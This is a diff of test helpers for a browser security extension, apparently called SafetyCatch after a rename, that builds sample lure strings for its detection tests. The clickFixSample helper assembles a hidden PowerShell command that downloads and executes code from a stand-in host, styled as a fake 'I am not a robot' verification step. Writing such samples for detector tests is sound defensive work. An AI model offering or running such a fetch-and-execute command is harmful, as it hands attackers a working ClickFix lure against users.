@@ -1,4 +1,4 @@
-// Copyright 2026 The ActionGuard Authors
+// Copyright 2026 The SafetyCatch Authors
 // SPDX-License-Identifier: Apache-2.0
 //
 // Test helpers.
@@ -8,7 +8,7 @@
 // attack string that antivirus software would quarantine (CONVENTIONS.md 6).
 // All domains are defanged (.example, .test, example.com).
 
-import * as engine from 'actionguard-engine';
+import * as engine from 'safetycatch-engine';
 import { createCore, type Core, type CoreDeps, type Engine, type KeyValue } from '../src/background/core.ts';
 import { LOCALE_FOLDERS, UI_LOCALES, type UiLocale } from '../src/shared/i18n.ts';
 import type { ShowPush } from '../src/shared/protocol.ts';
@@ -21,7 +21,7 @@ export const arm = (s: string): string => s.replace(/¦/g, '');
 export const clickFixSample = (): string => arm('pow¦ershell -w hid¦den -nop -c "i¦wr https://cdn.example.test/v | i¦ex" # I am not a robot - reCAPTCHA Verification ID: 5521');
 
 /** A harmless line that still reads like a fake-verification command (it only prints text). */
-export const harmlessLure = (): string => arm('pow¦ershell -w hid¦den -c "Write-Output \'ActionGuard test\'" # I am not a robot - reCAPTCHA Verification ID: 4821');
+export const harmlessLure = (): string => arm('pow¦ershell -w hid¦den -c "Write-Output \'SafetyCatch test\'" # I am not a robot - reCAPTCHA Verification ID: 4821');
 
 /** A made-up token shaped like a GitHub token. Never a real key. */
 export const fakeToken = (): string => arm('gh¦p_¦A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8');
